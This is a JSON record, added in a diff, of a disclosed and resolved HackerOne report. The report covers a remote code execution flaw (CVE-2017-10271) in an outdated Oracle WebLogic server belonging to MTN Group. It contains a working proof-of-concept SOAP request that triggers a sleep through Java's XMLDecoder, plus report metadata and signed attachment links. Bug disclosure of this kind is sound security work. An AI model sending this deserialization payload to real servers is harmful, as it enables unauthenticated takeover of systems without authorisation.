@@ -1,0 +1,187 @@
+{
+  "id": 810755,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MTA3NTU=",
+  "url": "https://hackerone.com/reports/810755",
+  "title": "Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-10271]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-04T13:45:59.061Z",
+  "submitted_at": "2020-03-04T13:45:59.061Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tounsi_007",
+    "url": "/tounsi_007",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/Rx1fFxpjqMtAcAEx9zgTHYhe/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-10271"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-04-25T12:39:51.124Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-26T12:39:47.134Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Summary\n\nHello. I was able to identify RCE vulnerability due to the outdated Oracle Weblogic instance on `https://raebilling.mtn.co.za`.\n\n##Steps To Reproduce\n\n* To reproduce, launch this request with BurpSuite\n* This request to the `https://raebilling.mtn.co.za/wls-wsat/CoordinatorPortType` will trigger sleep for 15 seconds (same applies for 20 secondes, 40 seconds):\n\n```\nPOST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1\nHost: raebilling.mtn.co.za\nContent-Length: 426\ncontent-type: text/xml\nAccept-Encoding: gzip, deflate, compress\nAccept: */*\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java class=\"java.beans.XMLDecoder\">\n        <object class=\"java.lang.Thread\" method=\"sleep\">\n          <long>40000</long>\n        </object>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>\n```\n==**POC:**== {F736913} {F736912} {F736915}\n\n## Suggested Mitigation/Remediation Actions\n* Patching WebLogic to the recent version will fix the issue.\n\n## Impact\n\n**This vulnerability allow an unauthenticated attacker:**\n* To perform Remote OS Command Execution.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 736912,
+      "file_name": "RCE_Sleep_20.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uHUm8A7oSA6PffDWUeErYJwT?response-content-disposition=attachment%3B%20filename%3D%22RCE_Sleep_20.png%22%3B%20filename%2A%3DUTF-8%27%27RCE_Sleep_20.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3VOAJ5JJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIDYMp37QsBNBxu1nn5awX6pl44hrWPc81aYLjOudT7CWAiEA3xmCbKgPpokj11LVwvXsNyDmj3zGNjdVHHqLd29MlWIqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFqnOI1hiucLvRgH%2BiqOBQEQXNq0tP%2Fqj8fScUTljgfvPSnT0BjJ1GS0AP0%2FMZiWQDTH%2BtdmOtEyA%2FWuAN9UJNatey1lUN3QlzYtLeF8L3bfLrHq86a0tbaqA8iCypAICC6BRLTyHwtz4ONL9jm6QEhOIiIElq4oVqFAVIhrQgCKghK0uQbf6xmwu2VciG8nywi4V14Rj1vOTeyvvh%2BWCRLonHV5xL2NY5kTbQinf2U48n2iGjzb1H3%2FcgoIDP9vKW2Q5A16vJELiMtKs2GBQFmr3S6FEalHjsC5bzhZsMED%2FXPnzTuN464ZdREHeocqG4jRx5x4LBzQ3F0a9PiV3vpMF6Kgp1KhCqBrCIHoB%2FoE0SM8JbRgEWW9rev0ku1JqfSfNAZnq2IJX38lkSBCi1tL%2BHeRzngNQlI0yM3YV967VAclhSFsa5cMX0e%2FjyBmjeMWIPMcdHZ2mzdM9Fa9SMdTDdAA3X0CfLr9ihAf48l0DA03R3cfr8U8uWCuymunj94xR6CWYkxoSQNdX8ymoItqYEVfSx84etz%2BfeBYG5VrZKQunM7wjjiJ%2FEKNmOKrfcg9HRsq2YyI3Woc0cKbZ%2FeBUOVdKjr8UtzhmosPoR%2BhHIJKF8XhPJvtGTJh6bxXniIe4RxlhAUU0Fnu28C79yktJF9TQNczdl%2F70NbgfJbK5Lhrr0qcg2Eb8X%2FImXWZLtP4Gu%2BLB2ECGIyrOI3yKKAsfQPQpoCL9jvKWDV5KuU4ueAtzBUxcA3ImPnPXNDPZe0ILs5LYhbKsJtfMwLFV%2BmRJWAXXWVKok3QE%2FOS6x4Ts%2B7emSF0Pm8ibXQL18SALBmNCFOMdHLlM%2B0yXdZL9bHYRpiMhSdyIEgRiRh%2BBm%2B663GJQukdgPbX37Ps0jDy7%2FzPBjqxAZh2UdjJYISEAf8m2DpheYNBlFoysBS8uq6btSNnbeUoOWlDLQmOLSLKvS6JbLp7NCJwRdiIuDHz8wIuDsEV4ZLtIq5RNrnuBOndf00a1jAb3ETW5JoqbXVlc5zqt3l6oMyfDXcGa6YsAKDYeeT7yQhfCZLtVyafdKlswCAEXFdTeeYTFQuv80dJYdprYIiSh%2BxUyxNujNp0BS%2FvU8LxXhzUWUs1Wlne0GGOn8I6gKHyMg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f47bf8d75b8d7d6e8abcb899011d9ec98915de132be22f4e71b9de0baa7d9927",
+      "file_size": 76608,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 736913,
+      "file_name": "RCE_Sleep_15.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JzhtUvCVpJBU9GGTvZAmMfhf?response-content-disposition=attachment%3B%20filename%3D%22RCE_Sleep_15.png%22%3B%20filename%2A%3DUTF-8%27%27RCE_Sleep_15.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3VOAJ5JJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151456Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIDYMp37QsBNBxu1nn5awX6pl44hrWPc81aYLjOudT7CWAiEA3xmCbKgPpokj11LVwvXsNyDmj3zGNjdVHHqLd29MlWIqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFqnOI1hiucLvRgH%2BiqOBQEQXNq0tP%2Fqj8fScUTljgfvPSnT0BjJ1GS0AP0%2FMZiWQDTH%2BtdmOtEyA%2FWuAN9UJNatey1lUN3QlzYtLeF8L3bfLrHq86a0tbaqA8iCypAICC6BRLTyHwtz4ONL9jm6QEhOIiIElq4oVqFAVIhrQgCKghK0uQbf6xmwu2VciG8nywi4V14Rj1vOTeyvvh%2BWCRLonHV5xL2NY5kTbQinf2U48n2iGjzb1H3%2FcgoIDP9vKW2Q5A16vJELiMtKs2GBQFmr3S6FEalHjsC5bzhZsMED%2FXPnzTuN464ZdREHeocqG4jRx5x4LBzQ3F0a9PiV3vpMF6Kgp1KhCqBrCIHoB%2FoE0SM8JbRgEWW9rev0ku1JqfSfNAZnq2IJX38lkSBCi1tL%2BHeRzngNQlI0yM3YV967VAclhSFsa5cMX0e%2FjyBmjeMWIPMcdHZ2mzdM9Fa9SMdTDdAA3X0CfLr9ihAf48l0DA03R3cfr8U8uWCuymunj94xR6CWYkxoSQNdX8ymoItqYEVfSx84etz%2BfeBYG5VrZKQunM7wjjiJ%2FEKNmOKrfcg9HRsq2YyI3Woc0cKbZ%2FeBUOVdKjr8UtzhmosPoR%2BhHIJKF8XhPJvtGTJh6bxXniIe4RxlhAUU0Fnu28C79yktJF9TQNczdl%2F70NbgfJbK5Lhrr0qcg2Eb8X%2FImXWZLtP4Gu%2BLB2ECGIyrOI3yKKAsfQPQpoCL9jvKWDV5KuU4ueAtzBUxcA3ImPnPXNDPZe0ILs5LYhbKsJtfMwLFV%2BmRJWAXXWVKok3QE%2FOS6x4Ts%2B7emSF0Pm8ibXQL18SALBmNCFOMdHLlM%2B0yXdZL9bHYRpiMhSdyIEgRiRh%2BBm%2B663GJQukdgPbX37Ps0jDy7%2FzPBjqxAZh2UdjJYISEAf8m2DpheYNBlFoysBS8uq6btSNnbeUoOWlDLQmOLSLKvS6JbLp7NCJwRdiIuDHz8wIuDsEV4ZLtIq5RNrnuBOndf00a1jAb3ETW5JoqbXVlc5zqt3l6oMyfDXcGa6YsAKDYeeT7yQhfCZLtVyafdKlswCAEXFdTeeYTFQuv80dJYdprYIiSh%2BxUyxNujNp0BS%2FvU8LxXhzUWUs1Wlne0GGOn8I6gKHyMg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=85d41a4a463112bda6a011f6aa1c5b00bad42adb0f626ef97a9e123292ed2045",
+      "file_size": 77123,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 736915,
+      "file_name": "RCE_Sleep_40.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zSkKiHBmne5vFkBcKgoyiVQK?response-content-disposition=attachment%3B%20filename%3D%22RCE_Sleep_40.png%22%3B%20filename%2A%3DUTF-8%27%27RCE_Sleep_40.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3VOAJ5JJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151456Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIDYMp37QsBNBxu1nn5awX6pl44hrWPc81aYLjOudT7CWAiEA3xmCbKgPpokj11LVwvXsNyDmj3zGNjdVHHqLd29MlWIqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFqnOI1hiucLvRgH%2BiqOBQEQXNq0tP%2Fqj8fScUTljgfvPSnT0BjJ1GS0AP0%2FMZiWQDTH%2BtdmOtEyA%2FWuAN9UJNatey1lUN3QlzYtLeF8L3bfLrHq86a0tbaqA8iCypAICC6BRLTyHwtz4ONL9jm6QEhOIiIElq4oVqFAVIhrQgCKghK0uQbf6xmwu2VciG8nywi4V14Rj1vOTeyvvh%2BWCRLonHV5xL2NY5kTbQinf2U48n2iGjzb1H3%2FcgoIDP9vKW2Q5A16vJELiMtKs2GBQFmr3S6FEalHjsC5bzhZsMED%2FXPnzTuN464ZdREHeocqG4jRx5x4LBzQ3F0a9PiV3vpMF6Kgp1KhCqBrCIHoB%2FoE0SM8JbRgEWW9rev0ku1JqfSfNAZnq2IJX38lkSBCi1tL%2BHeRzngNQlI0yM3YV967VAclhSFsa5cMX0e%2FjyBmjeMWIPMcdHZ2mzdM9Fa9SMdTDdAA3X0CfLr9ihAf48l0DA03R3cfr8U8uWCuymunj94xR6CWYkxoSQNdX8ymoItqYEVfSx84etz%2BfeBYG5VrZKQunM7wjjiJ%2FEKNmOKrfcg9HRsq2YyI3Woc0cKbZ%2FeBUOVdKjr8UtzhmosPoR%2BhHIJKF8XhPJvtGTJh6bxXniIe4RxlhAUU0Fnu28C79yktJF9TQNczdl%2F70NbgfJbK5Lhrr0qcg2Eb8X%2FImXWZLtP4Gu%2BLB2ECGIyrOI3yKKAsfQPQpoCL9jvKWDV5KuU4ueAtzBUxcA3ImPnPXNDPZe0ILs5LYhbKsJtfMwLFV%2BmRJWAXXWVKok3QE%2FOS6x4Ts%2B7emSF0Pm8ibXQL18SALBmNCFOMdHLlM%2B0yXdZL9bHYRpiMhSdyIEgRiRh%2BBm%2B663GJQukdgPbX37Ps0jDy7%2FzPBjqxAZh2UdjJYISEAf8m2DpheYNBlFoysBS8uq6btSNnbeUoOWlDLQmOLSLKvS6JbLp7NCJwRdiIuDHz8wIuDsEV4ZLtIq5RNrnuBOndf00a1jAb3ETW5JoqbXVlc5zqt3l6oMyfDXcGa6YsAKDYeeT7yQhfCZLtVyafdKlswCAEXFdTeeYTFQuv80dJYdprYIiSh%2BxUyxNujNp0BS%2FvU8LxXhzUWUs1Wlne0GGOn8I6gKHyMg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5c362b10281ee9996f02d6cac44e6140d576efb77cd095d9ef8c28eb43111c72",
+      "file_size": 66460,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-04-25T12:39:47.169Z",
+  "allow_singular_disclosure_after": -158985308.83310872,
+  "singular_disclosure_allowed": true,
+  "vote_count": 28,
+  "voters": [
+    "0xssrf",
+    "yukusawa18",
+    "battle_angel",
+    "shreyaschavhan",
+    "yassinek3ch",
+    "ali",
+    "tounsi_007",
+    "akashhamal0x01",
+    "jmo740",
+    "lesleybw",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.4,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 34307,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.co.za",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 45150,
+      "category": "researcher",
+      "content": "\n## CVE-2017-10271 :\n>\n* Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.\n>",
+      "updated_at": "2021-04-25T06:01:55.096Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 199677,
+        "username": "tounsi_007",
+        "name": "Sebei",
+        "bio": "Hack the planet !! ",
+        "cleared": true,
+        "verified": true,
+        "website": null,
+        "location": "Break it to make it safe!",
+        "created_at": "2017-09-13T10:03:35.718Z",
+        "url": "https://hackerone.com/tounsi_007",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/Rx1fFxpjqMtAcAEx9zgTHYhe/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/Rx1fFxpjqMtAcAEx9zgTHYhe/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/Rx1fFxpjqMtAcAEx9zgTHYhe/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    }
+  ]
+}
